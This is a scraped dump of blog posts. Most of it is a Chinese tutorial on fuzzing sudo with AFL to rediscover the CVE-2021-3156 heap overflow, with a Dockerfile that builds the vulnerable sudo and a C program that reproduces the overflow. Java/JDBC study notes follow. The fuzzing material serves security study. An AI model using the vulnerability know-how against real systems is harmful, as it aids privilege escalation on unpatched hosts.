可以写一个小的例子调试一下 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;ctype.h&gt;#include &lt;string.h&gt;int main()&#123; char from[100]; puts(&quot;please input some data, max is 100&quot;); read(0,from,100); int len = strlen(from); char *src = from; char *to = (char *)malloc(len); char *dst = to+1; puts(&quot;start copy file&quot;); while(*src)&#123; if (src[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)src[1])) src++; *dst++ = *src++; &#125; *to++ = &#x27;\\n&#x27;; printf(&quot;src&gt; %s&quot;,from); printf(&quot;dst&gt; %s&quot;,to);&#125; 构造这样的特殊输入，在输入的时候已经输入0x18个字符串了，所以是malloc(0x18) 按照程序的效果，会将下一个chunk的头部份覆写为0xbbbbbbbb 成功覆盖掉，实现预期堆溢出的目标，说明当结尾的反斜杠后面还有数据的时候会产生堆溢出","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"SUDO堆溢出提权：从fuzz到exp [1]","slug":"sudo-fuzz2exp-1","date":"2022-04-11T02:40:44.000Z","updated":"2023-06-01T14:23:45.120Z","comments":true,"path":"2022/04/11/sudo-fuzz2exp-1/","link":"","permalink":"https://joe1sn.eu.org/2022/04/11/sudo-fuzz2exp-1/","excerpt":"前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit","text":"前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit My previous blog: https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ I was inspired by the LiveOverflow’s Sudo Vulnerability Walkthrough on youtube, but i found there’s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this “from fuzz to exploit” series. Original Videos: https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx Original Blog: https://liveoverflow.com/why-pick-sudo-research-target-part-1/ Source Project Code: https://github.com/LiveOverflow/pwnedit 本节内容： Why Pick sudo as Research Target? | Ep. 01 How Fuzzing with AFL works! | Ep. 02 环境搭建 在最开始的复现博客中，我最初打算在docker中搭建整个项目，但是由于在docker上exp需要微调和学业压力导致我并不能花太多时间在上面，所以我直接使用的虚拟机。不过在原始的备份文档中我依然保存了当时搭建docker的记录，这里和原作者使用的方法类似. Docker LiveOverflow在项目的git仓库中有了这个dockerfile文件。因为中国GFW，所以我换了下源，如果不需要可以删掉。我这里用的是windows的DesktopDocker搭建 ep1\\Dockerfile 12345678910111213FROM ubuntu:20.04ENV LC_CTYPE C.UTF-8ARG DEBIAN_FRONTEND=noninteractiveRUN sed -i &#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27; /etc/apt/sources.list &amp;&amp;\\ apt-get update &amp;&amp; \\ apt-get install -yq gcc make wget curl git vim gdb clang llvm python3 python3-pip bsdmainutilsRUN cd /root/ &amp;&amp; wget https://www.sudo.ws/dist/sudo-1.8.31p2.tar.gz &amp;&amp; tar -xvf sudo-1.8.31p2.tar.gz &amp;&amp; cd sudo-1.8.31p2 &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make installRUN cd /root/ &amp;&amp; git clone https://github.com/google/AFL &amp;&amp; cd AFL &amp;&amp; make &amp;&amp; cd llvm_mode &amp;&amp; make &amp;&amp; cd .. &amp;&amp; make installRUN useradd -ms /bin/bash userRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;31m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]# &quot;&#x27; &gt;&gt; /root/.bashrcRUN echo &#x27;export PS1=&quot;\\[\\e]0;\\u@\\h: \\w\\a\\]\\[\\033[01;32m\\]\\u\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]$ &quot;&#x27; &gt;&gt; /home/user/.bashrcUSER userWORKDIR /home/user 从 ubuntu20.04 的基础镜像中，设置编码为 ENV LC_CTYPE C.UTF-8，设置非交互式操作(ARG DEBIAN_FRONTEND=noninteractive)，升级源并安装必要的编译运行环境，之后下载有漏洞的 sudoedit 源代码编译安装。 之后在该docker中安装 AFL(American Fuzzy Lop) 的模糊测试软件，添加普通用户 user，最后修改命令提示符的界面美化一下并设置工作目录 你可以使用docker build . -t sudo1来创建docker，但是同时作者编写了一个makefile来方便管理 12345678910111213141516171819.PHONY : all stop build run attach rootall : stop build runstop: -docker stop sudo1 sleep 1 -docker rmi sudo1build: docker build --no-cache -t sudo1 .run: docker run --rm -v $(CURDIR):/pwd --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -d --name sudo1 -i sudo1attach: docker exec -it sudo1 /bin/bashroot: docker exec -u root -it sudo1 /bin/bash 在make run的时候设置了-v $(CURDIR):/pwd参数可以让该目录下的文件同样位于在docker中的/pwd中，但是由于我使用的是DesktopDocker+VsCode(Docker plugin)，对我来说不是很必要 所以可以make或者make build来创建docker &gt;&gt;遇到的问题 ERROR [4/8] RUN cd /root/ &amp;&amp; git clone https://github.com/google/AFL &amp;&amp; cd AFL &amp;&amp; make &amp;&amp; make install 中国大陆网络屏蔽了github，导致其无法git仓库，可以挂代理，或者在docker创建好过后再利用pwd文件夹放入afl docker搭建时间长 正常现象，更新下载的时间有点长，这取决于网速 创建容器make run 创建完成后使用make attach进入docker AFL 项目链接：https://lcamtuf.coredump.cx/afl/ American fuzzy lop is a security-oriented fuzzer that employs a novel type of compile-time instrumentation and genetic algorithms to automatically discover clean, interesting test cases that trigger new internal states in the targeted binary. This substantially improves the functional coverage for the fuzzed code. The compact synthesized corpora produced by the tool are also useful for seeding other, more labor- or resource-intensive testing regimes down the road. 编译安装AFL 这里我是去掉git afl的，所以后来要装上 问题：权限不够 以docker exec -it -u root ContainerID /bin/bash进入，然后编译安装afl就行了 开始FUZZ AFL编译sudo AFL的测试是以白盒测试为基础的，我们要使用AFL的编译器对代码进行重新编译；虽然黑盒也行，但是要依靠插桩和qemu 进入sudo文件夹 123CC=afl-gcc ./configure --disable-sharedmake cleanmake -j8 出现图中afl-as之类的提示字符，说明正在使用afl编译 AFL进行分析与fuzz AFL的分析方式有两种 输入为文件 1afl-fuzz -i input_cases -o output_cases -- ./app.bin @@ @@就代表我们的输入示例 输入为stdin输入流 1afl-fuzz -i input_cases -o output_cases -- ./app.bin 但是这里我们的是使用sudo参数处理的字符串 原作者通过搜索afl fuzz argv发现了在AFL的experimental实验性质文件夹中的argv-fuzz-inl.h头文件，具有以下描述 所以我们找到sudo main函数的文件，并且将argv-fuzz-inl.h复制到同一个文件夹下，然后在main函数附近添加AFL_INIT_ARGV()函数 AFL_INIT_ARGV()的原理 可以看原来的头文件： 1#define AFL_INIT_ARGV() do &#123; argv = afl_init_argv(&amp;argc); &#125; while (0) afl_init_argv 123456789101112131415161718192021222324static char** afl_init_argv(int* argc) &#123; static char in_buf[MAX_CMDLINE_LEN]; static char* ret[MAX_CMDLINE_PAR]; char* ptr = in_buf; int rc = 1; /* start after argv[0] */ if (read(0, in_buf, MAX_CMDLINE_LEN - 2) &lt; 0); while (*ptr) &#123; ret[rc] = ptr; /* insert &#x27;\\0&#x27; at the end of ret[rc] on first space-sym */ while (*ptr &amp;&amp; !isspace(*ptr)) ptr++; *ptr = &#x27;\\0&#x27;; ptr++; /* skip more space-syms */ while (*ptr &amp;&amp; isspace(*ptr)) ptr++; rc++; &#125; *argc = rc; return ret;&#125; 本质上该函数就是一个宏定义，将原始的argv替换为afl_init_argv，从而能被后续的fuzzer所分析 afl_init_argv流程 输入流in_buf开始读取 指针不为NULL和空格一直读取 出现空格或NULL置结尾为NULL， 若为空格，参数数目rc+1 最后返回ret，让ret代替了原来的argv，同时argc被改写为rc 重编译sudo 12CC=afl-gcc ./configure --disable-sharedmake clean &amp;&amp; make -j8 这里就直接略过afl的测试了，因为肯定会崩溃 AFL是如何工作的 这里开始是第二节的内容了。 我们的主要目标是fuzz出sudo存在的CVE-2021-3156漏洞，然后完成exp的编写，所以并不会细致的讲解fuzz的具体工作原理和过程。不过fuzz主要有以下几个过程： 预处理 分析和获取有用信息，使用PIN，符号执行，污点检查 黑盒白盒 输入构建 从数据 SSS（种子）产生大量变异数据 III。 输入选择 过滤无效数据，优化模糊测试 评估 大多数关于模糊的研究集中在两个指标上：覆盖率和利用漏洞的平均时间 关于上一节的报错 这里就体现了互联网的艺术：https://milek7.pl/howlongsudofuzz/，这篇文章遇到了相同的问题他的解决方案是： 将afl-gcc编译器替换为基于LLVM的afl-clang编译 For some reason afl-gcc instrumentation didn’t work, so I used LLVM-based one. We just need to override CC for ./configure: 1CC=afl-clang-fast ./configure Clang是个啥？ 了解过编译原理的人，或者编写恶意代码的人对这个一定很熟悉 The Clang project provides a language front-end and tooling infrastructure for languages in the C language family (C, C++, Objective C/C++, OpenCL, CUDA, and RenderScript) for the LLVM project. Both a GCC-compatible compiler driver (clang) and an MSVC-compatible compiler driver (clang-cl.exe) are provided. You can get and build the source today. 编译器的结构 简单理解的话就是说Clang是gcc编译器的另外一个实现 同时AFL也支持使用afl-clang，和afl-gcc的用法相同 The clang wrappers (afl-clang and afl-clang++) can be used in the same way; clang users may also opt to leverage a higher-performance instrumentation mode, as described in llvm_mode/README.llvm. 这就涉及到afl-clang-fast的安装了 解决上一节的报错 安装afl-clang和afl-clang++ 安装clang和llvm（dockerfile中已经提前装好了） 1sudo apt-get install llvm clang 进入编译安装afl-clang和afl-clang++ 1234cd llvm_modemakecd ..make install 重编译sudo 1CC=afl-clang-fast ./configure --disable-shared &amp;&amp; make -j8 这里我发现其实在user用户下也会Segmentation fault，这个是因为权限的问题，后面就大致能感受出来了 开始Fuzz 创建输入输出 123mkdir ../input ../outputecho -en &quot;-l\\x00&quot; &gt; ../input/testcase1afl-fuzz -i ../input/ -o ../output/ -- ./src/sudo AFL的说明 AFL是以基于覆盖率测试的模糊测试工具，将编译过的数据送到被测试的程序中。被测试的程序中有使用AFL编译器编译时的插桩代码(__afl_maybe_log)，可以让编译器返回那些函数被执行过（被覆盖到） 例如在windows的模糊测试中，可以使用DynamoRIO对文件进行覆盖率测试 12D:\\HackTools\\Fuzz\\winafl\\build_x64\\bin\\Release&gt;D:\\HackTools\\Fuzz\\DynamoRIO-Windows-8.0.0-1\\bin64\\drrun.exe -t drcov -- test.exe not_kitty.bmpError 1 然后再IDA中加载覆盖率文件 其中绿色的就是单次执行被覆盖到的代码，被覆盖到的代码越多，测试也就越准确。 所以AFL可以通过插桩代码，不断改进输入的数据，从而得到更高的覆盖率 会得到漏洞吗？ 不会的，在前文中已经写过了 sudoedit就是一个链接到sudo的文件 但是我们是尝试独立挖掘出这个漏洞，并且 sudoedit 是作为独立插件编译得，所以我们并不能直接的测试sudoedit -s 在测试前了解你要测试的程序 123man sudowhereis sudowhereis sudoedit &gt;&gt;问题 This system has been minimized by removing packages and content that are not required on a system that users do not log into.To restore this content, including manpages, you can run the ‘unminimize’ command. You will still need to ensure the ‘man-db’ package is installed. 解决方法和造成原因在这儿：https://github.com/docker/for-linux/issues/639#issuecomment-478765756 直接输入unminimize，这会花很长的时间，真的很长 新的思路 细心一点可能会发现在之前的 123456789101112131415161718192021222324static char** afl_init_argv(int* argc) &#123; static char in_buf[MAX_CMDLINE_LEN]; static char* ret[MAX_CMDLINE_PAR]; char* ptr = in_buf; int rc = 1; /* start after argv[0] */ if (read(0, in_buf, MAX_CMDLINE_LEN - 2) &lt; 0); while (*ptr) &#123; ret[rc] = ptr; /* insert &#x27;\\0&#x27; at the end of ret[rc] on first space-sym */ while (*ptr &amp;&amp; !isspace(*ptr)) ptr++; *ptr = &#x27;\\0&#x27;; ptr++; /* skip more space-syms */ while (*ptr &amp;&amp; isspace(*ptr)) ptr++; rc++; &#125; *argc = rc; return ret;&#125; 其中rc=1，说明是从argv[1]开始创建fake_argv的，但是我们知道argv[0]就是程序自身，那么我们就可以通过fuzz argv[0]从而找到sudoedit。那么修改试试看，重新编译sudo &gt;&gt;问题 为什么没有变化 改的是同级目录下的argv-fuzz-inl.h文件 **为什么都一样？**问题的解决同样在这里：https://milek7.pl/howlongsudofuzz/ Quick test shows that sudo/sudoedit selection doesn’t work correctly from testcases passed in stdin, because for some reason it uses __progname. sudo/sudoedit不会直接使用argv[0]作为程序名称，而是使用__progname 阅读sudo源代码我们发现 在main中 参数数目&gt;0，传递argv[0]，否则使用sudo作为参数 在ep1\\sudo-1.8.31p2\\lib\\util\\progname.c: init_progname中 定义了HAVE___PROGNAME，那么在编译时如果__progname不存在，才会用argv[0]做成程序名 （因为vscode认为是windwos环境，所以这里是灰色的） 解决：直接删掉后重新编译 开始多核fuzz -M 选定主fuzz的单元（Master） 1afl-fuzz -M master -i /tmp/in -o /tmp/out/ -- ./src/sudo -S 选定为从属fuzz单元（Slave） 1afl-fuzz -S slave -i /tmp/in -o /tmp/out/ -- ./src/sudo","categories":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/categories/CVE/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://joe1sn.eu.org/tags/CVE/"},{"name":"fuzz","slug":"fuzz","permalink":"https://joe1sn.eu.org/tags/fuzz/"}]},{"title":"JavaWeb笔记-JDBC","slug":"java-day3-JDBC","date":"2022-03-19T11:49:07.000Z","updated":"2023-06-01T14:23:16.654Z","comments":true,"path":"2022/03/19/java-day3-JDBC/","link":"","permalink":"https://joe1sn.eu.org/2022/03/19/java-day3-JDBC/","excerpt":"基本概念 快速入门 对JDBC中各个接口和类详解","text":"基本概念 快速入门 对JDBC中各个接口和类详解 JDBC概念 **概念：**Java DataBase Connectivity ，Java数据库连接 本质（类似Django的ORM）:The sun公司定义的一套操作所有关系型数据库的规则（接口）。各个厂家根据接口去实现。我们可以是有这套接口编程，真正的驱动时jar包中的实现类 快速入门 简单步骤 导入驱动jar包 注册驱动 数据库连接对象Connection 定义sql 获取执行SQL语句的Statement对象 执行sql，接受返回结果 处理结果 释放资源 简单使用 123456789101112131415161718192021222324252627282930package learn.jdbc;import java.sql.Connection;import java.sql.DriverManager;import java.sql.Statement;/*JDBC快速入门 */public class JdbcDemo1 &#123; public static void main(String[] args) throws Exception &#123; //1.导入驱动jar包 //2.注册驱动 Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); //3.获取数据库连接对象 Connection conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/javaweb&quot;,&quot;root&quot;,&quot;J8L 7T&quot;); //4.定义sql语句 String sql = &quot;update user set UID=00000 where XH=302&quot;; //5.获取执行sql对象 Statement statement = conn.createStatement(); //6.执行sql方法 int count = statement.executeUpdate(sql); //7.处理结果 System.out.println(count); //8.释放资源 statement.close(); conn.close(); &#125;&#125; 步骤详解 DriverManager：驱动管理对象 注册驱动 注册与给定的驱动程序 DriverManager 1static void registerDriver(Driver driver) 写代码使用 1Class.forName(&quot;com.mysql.jdbc.Driver&quot;); 为静态代码使用 12345package com.mysql.cj.jdbc;public class Driver extends com.mysql.cj.jdbc.NonRegisteringDriver implements java.sql.Driver &#123; public Driver() throws java.sql.SQLException &#123; /* compiled code */ &#125;&#125; mysql5.0以上可以不用注册驱动 获取数据库连接 尝试建立与给定数据库URL的连接。 1static Connection getConnection(String url, String user, String password) url：jdbc:mysql://ip:port/database 默认为本地sql地址及默认端口 Connection：数据库连接对象 获取执行sql对象 1Statement createStatement() 1PreparedStatement prepareStatement(String sql) 管理事务 开启事务：参数为false即开启事务 1void setAutoCommit(boolean autoCommit) 提交事务 1void commit() 回滚事务 1void rollback() Statement：执行sql对象 执行任意sql 1boolean execute(String sql) 执行DML DDL语句，返回影响的行数 1int executeUpdate(String sql) 1ResultSet executeQuery(String sql) ResultSet：结果集对象 PreparedStatement：执行sql对象 JDBC工具类：JDBCUtils 目的：简化书写 分析： 注册驱动也抽取 抽取一个方法获取连接对象 抽取方法释放资源 抽取连接对象 1 close释放资源重载 123456789101112131415161718192021222324252627282930313233343536373839404142public static void close(Statement stmt, Connection conn)&#123; if(stmt != conn)&#123; try &#123; stmt.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if(conn != null) &#123; try &#123; conn.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125;&#125;//释放方法2public static void close(ResultSet rs, Statement stmt, Connection conn)&#123; if (rs != conn)&#123; try&#123; rs.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if(stmt != conn)&#123; try &#123; stmt.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if(conn != null) &#123; try &#123; conn.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125;&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"JavaWeb笔记-数据库","slug":"java-d2-database","date":"2022-03-18T08:26:12.000Z","updated":"2023-06-01T14:23:04.393Z","comments":true,"path":"2022/03/18/java-d2-database/","link":"","permalink":"https://joe1sn.eu.org/2022/03/18/java-d2-database/","excerpt":"","text":"SQL分类 数据查询语言（DQL） 数据查询语言（Data Query Language, DQL）是SQL语言中，负责进行数据查询而不会对数据本身进行修改的语句，这是最基本的SQL语句。保留字SELECT是DQL（也是所有SQL）用得最多的动词，其他DQL常用的保留字有FROM，WHERE，GROUP BY，HAVING和ORDER BY。这些DQL保留字常与其他类型的SQL语句一起使用。 数据定义语言（DDL）(CRUD) 数据定义语言 (Data Definition Language, DDL) 是SQL语言集中，负责数据结构定义与数据库对象定义的语言，由CREATE、ALTER与DROP三个语法所组成，最早是由 Codasyl (Conference on Data Systems Languages) 数据模型开始，现在被纳入 SQL 指令中作为其中一个子集。 数据操纵语言（DML） 数据操纵语言（Data Manipulation Language, DML）是SQL语言中，负责对数据库对象运行数据访问工作的指令集，以INSERT、UPDATE、DELETE三种指令为核心，分别代表插入、更新与删除。 数据控制语言（DCL） 数据控制语言 (Data Control Language) 在SQL语言中，是一种可对数据访问权进行控制的指令，它可以控制特定用户账户对数据表、查看表、预存程序、用户自定义函数等数据库对象的控制权。由 GRANT 和 REVOKE 两个指令组成。DCL以控制用户的访问权限为主，GRANT为授权语句，对应的REVOKE是撤销授权语句。 指针控制语言（CCL） 它的语句，像DECLARE CURSOR，FETCH INTO和UPDATE WHERE CURRENT用于对一个或多个表单独行的操作。 事务处理语言（TPL） 它的语句能确保被DML语句影响的表的所有行及时得以更新。TPL语句包括BEGIN TRANSACTION，COMMIT和ROLLBACK。","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"JavaWeb笔记-注解","slug":"java-d1-annotation","date":"2022-03-16T12:49:29.000Z","updated":"2023-06-01T14:27:37.754Z","comments":true,"path":"2022/03/16/java-d1-annotation/","link":"","permalink":"https://joe1sn.eu.org/2022/03/16/java-d1-annotation/","excerpt":"注释部分","text":"注释部分 注解 概念：说明程序。For计算机 从JDK1.5开始，Java增加对元数据的支持，也就是注解，注解与注释是有一定区别的，可以把注解理解为代码里的特殊标记，这些标记可以在编译，类加载，运行时被读取，并执行相应的处理。通过注解开发人员可以在不改变原有代码和逻辑的情况下在源代码中嵌入补充信息。 注释：用文字描述程序。For程序员 作用 编写文档：标识生成doc文档 1234567891011121314package LearnJunit.annotation;/** * 注解 java doc演示 * @since 1.5 * @author joe1sn * @version 1.0 */public class AnnoDemo1 &#123; //计算两数之和 public int add(int a, int b)&#123; return a+b; &#125;&#125; javadoc AnnoDemo1.java -encoding UTF-8 -charset UTF-8 123456789101112131415161718正在加载源文件AnnoDemo1.java...正在构造 Javadoc 信息...标准 Doclet 版本 1.8.0_301正在构建所有程序包和类的树...正在生成.\\AnnoDemo1.html...正在生成.\\package-frame.html...正在生成.\\package-summary.html...正在生成.\\package-tree.html...正在生成.\\constant-values.html...正在构建所有程序包和类的索引...正在生成.\\overview-tree.html...正在生成.\\index-all.html...正在生成.\\deprecated-list.html...正在构建所有类的索引...正在生成.\\allclasses-frame.html...正在生成.\\allclasses-noframe.html...正在生成.\\index.html...正在生成.\\help-doc.html... 代码检查：代码分析（使用反射） 例子： @Override 也可以自定义注解【使用反射】 让编译器实现基本的检查 JDK预定义注解 @Override 编译检查，检查被标记方法是否是被父类覆写的方法 @Deprecated 该注解内容已过时 @SuppressWarnings 压制警告，需要传参，一般传递&quot;all&quot;压制所有警告 自定义注解及使用(解析) 格式 1234@Target(ElementType.METHOD)@Retention(RetentionPolicy.SOURCE)public @interface Override &#123;&#125; 1234元注解public @interface 注解名称&#123; 属性列表&#125; 本质：注解本质上就是一个接口，接口默认继承Annotation() 12public interface MyAnno extends java.lang.annotation.Annotation &#123;&#125; 属性：接口中可以定义的成员方法 要求： 属性返回类型 基本数据类型 String 枚举 注解 以上类型数组 1234567public @interface MyAnno &#123; int show1(); String show2(); Person per(); //枚举 MyAnno2 anno2();//注解 String[] strs();//字符串数组&#125; 定义的属性在使用时需要给属性赋值 缺少赋值： 只留下show1进行赋值 默认赋值 1234public @interface MyAnno &#123; int age(); String name() default &quot;Doe&quot;;&#125; 如果只有一个属性需要赋值，如果属性名称是value，直接赋值 123456package LearnJunit.annotation;@MyAnno(1)public class Worker &#123;&#125; 对于枚举、注解、字符串的注解 12345678@MyAnno(age=1, per=Person.P1, anno2=@MyAnno2,// strs=&#123;&quot;1&quot;,&quot;a&quot;,&quot;v&quot;&#125; strs = &quot;abcdefg&quot;)public class Worker &#123;&#125; 元注解：用于描述注解的注解 @Target：描述注解能够作用的位置 ElementType取值： TYPE：作用于类上 METHOD：作用于方法上 FIELD：作用于成员变量上 12345678//表示anno3注解只能作用于类上@Target(value = &#123; ElementType.TYPE, ElementType.METHOD, ElementType.FIELD&#125;)public @interface MyAnno3 &#123;&#125; @Retention：描述注解能被保留的阶段 RetentionPolicy：判断在哪个阶段，使用该注解 SOURCE CLASS RUNTIME（一般使用这个）：会保留到class字节码文件中，并被JVM读取到 @Documented：描述注解是否被抽取到api文档中 123456@MyAnno3public class Worker &#123; public String name = &quot;John&quot;; @MyAnno3 public void show()&#123;&#125;;&#125; 1234567891011121314151617181920/** * - @Target：描述注解能够作用的位置 - @Retention：描述注解能被保留的阶段 - @Documented：描述注解是否被抽取到api文档中 - @Inherited：描述注解是否这子类继承 */import java.lang.annotation.*;//表示anno3注解只能作用于类上@Target(value = &#123; ElementType.TYPE, ElementType.METHOD, ElementType.FIELD&#125;)@Documented@Retention(RetentionPolicy.RUNTIME)public @interface MyAnno3 &#123;&#125; 删除该注解后 @Inherited：描述注解是否被子类继承 解析注解 将配置文件的工作交给注解完成 123456789/** * 描述需要执行的类名和方法名 */@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)public @interface Pro &#123; String className(); String method();&#125; 1234567891011121314151617181920212223242526package LearnJunit.annotation;import LearnJunit.reflect.ReflectDemo1;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.Properties;//假设框架类@Pro(className = &quot;LearnJunit.annotation.Demo1&quot;, method = &quot;show&quot;)public class ReflectFramework &#123; public static void main(String[] args) throws Exception &#123; //1.解析注解 // 获取该类的字节码文件对象 Class&lt;ReflectFramework&gt; reflectFrameworkClass = ReflectFramework.class; //2.获得注解对象 // 内存中生成了该注解接口的 子类实现对象 Pro an = reflectFrameworkClass.getAnnotation(Pro.class); //3.调用注解对象中定义的抽象方法，获取返回值 String className = an.className(); &#125;&#125; 关于步骤2，在 21行下个断点 这个时候注解相关的都还没有对应数据，但是获得了注解(.getAnnotation)对象后 不仅reflectFrameworkClass注解有了值，而且在内存中多出了一个an变量，而an就是我们注解的内容 最后加上 1234567//4.反射获得类Class aClass = Class.forName(className);//5.获得类的方法Method aMethod = aClass.getMethod(methodName);//6.调用方法Object aObject = aClass.newInstance();aMethod.invoke(aObject); 就能使用注解中的类的对应方法了 案例 测试类 LearnJunit.annotation.demo.Calculator 123456789101112131415161718192021222324252627package LearnJunit.annotation.demo;public class Calculator &#123; @check public void add() &#123; System.out.println(&quot;1 + 0 = &quot; + (1 + 0)); &#125; @check public void sub() &#123; System.out.println(&quot;1 - 0 = &quot; + (1 - 0)); &#125; @check public void mul() &#123; System.out.println(&quot;1 * 0 = &quot; + (1 * 0)); &#125; @check public void div() &#123; System.out.println(&quot;1 / 0 = &quot; + (1 / 0)); &#125; public void show()&#123; System.out.println(&quot;always normal&quot;); &#125;&#125; 测试注解 LearnJunit.annotation.demo.check 1234567891011package LearnJunit.annotation.demo;import java.lang.annotation.ElementType;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;import java.lang.annotation.Target;@Target(ElementType.METHOD)@Retention(RetentionPolicy.RUNTIME)public @interface check &#123;&#125; 测试方法 LearnJunit.annotation.demo.testCheck 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package LearnJunit.annotation.demo;import java.io.BufferedWriter;import java.io.FileWriter;import java.io.IOException;import java.lang.reflect.Method;/** * 简单测试框架 * 挡住方法执行后，自动执行被检测的所有方法 */public class testCheck &#123; public static void main(String[] args) throws IOException &#123; //1.创建被测试对象 Calculator calculator = new Calculator(); //2.得到所有带注解的函数 int e_num = 0;//出现异常的次数 BufferedWriter bw = new BufferedWriter(new FileWriter(&quot;bug.txt&quot;));//创建文件对象 //2.1得到所有函数 Method[] methods = calculator.getClass().getMethods(); for (Method method:methods)&#123; //2.2检测是否带注解 if(method.isAnnotationPresent(check.class))&#123; //2.3若带注解则执行 try &#123; method.invoke(calculator); &#125; catch(Exception e)&#123; //2.3.1捕获异常 e.printStackTrace(); //2.3.2记录到文件 e_num++; bw.write(&quot;+++++&quot;+method.getName()+&quot; 方法异常&quot;); bw.newLine(); bw.write(&quot;异常名称&gt;&gt; &quot;+e.getCause().getClass().getSimpleName()); bw.newLine(); bw.write(&quot;异常原因&gt;&gt;&quot;+e.getCause().getMessage()); bw.newLine(); &#125; &#125; &#125; bw.write(&quot;本次测试一共出现 &quot;+e_num+&quot; 次异常&quot;); bw.newLine(); bw.flush(); bw.close(); &#125;&#125; 小结 大多数时候使用注解而不是自定义注解 注解给谁用： 编译器 解析程序（checkTest） 注解不是程序的一部分（相当于C的编译参数，如预编译命令）","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"java","slug":"notes/java","permalink":"https://joe1sn.eu.org/categories/notes/java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://joe1sn.eu.org/tags/Java/"}]},{"title":"JavaWeb笔记-Junit与反射","slug":"java-d1-Junit","date":"2022-03-15T23:27:53.000Z","updated":"2023-06-01T14:27:27.120Z","comments":true,"path":"2022/03/16/java-d1-Junit/","link":"","permalink":"https://joe1sn.eu.org/2022/03/16/java-d1-Junit/","excerpt":"Junit单元测试与反射 黑盒-白盒","text":"Junit单元测试与反射 黑盒-白盒 junit使用：白盒测试 步骤： 定义一个测试类 测试类名：被测试类+Test CalculatorTest 包名：xxx.xxx.xxx.test 定义测试方法：可以独立执行，建议 方法名：test测试方法名 testAdd() 返回值：void（独立运行） 参数列表：空参 方法+@test注解 导入Junit依赖环境 1234567891011121314151617package test;import junit.Calculator;import org.junit.Test;public class CalculatorTest &#123; //测试add方法 @Test public void testAdd()&#123; //System.out.printf(&quot;Excuted&quot;); //创建计算器对象 Calculator c = new Calculator(); //2.调用add方法 int result = c.add(1,2); System.out.println(result); &#125;&#125; 123456789101112package junit;//计算器public class Calculator &#123; //加法 public int add(int a, int b)&#123; return a+b; &#125; //减法 public int sub(int a, int b)&#123; return a-b; &#125;&#125; 在add添加除0异常 12345678910111213package junit;//计算器public class Calculator &#123; //加法 public int add(int a, int b)&#123; int i = 3/0; return a+b; &#125; //减法 public int sub(int a, int b)&#123; return a-b; &#125;&#125; 假设原方法中add写成了-，使用断言报错 1234567891011121314151617181920package test;import junit.Calculator;import org.junit.Assert;import org.junit.Test;public class CalculatorTest &#123; //测试add方法 @Test public void testAdd()&#123; //System.out.printf(&quot;Excuted&quot;); //创建计算器对象 Calculator c = new Calculator(); //2.调用add方法 int result = c.add(1,2); //断言assert Assert.assertEquals(3, result); &#125;&#125; 同理可以得到sub的测试函数 1234567//测试sub方法@Testpublic void testSub()&#123; Calculator c = new Calculator(); int result = c.sub(2,1); Assert.assertEquals(3,result);&#125; 注解补充 @Before 初始化方法 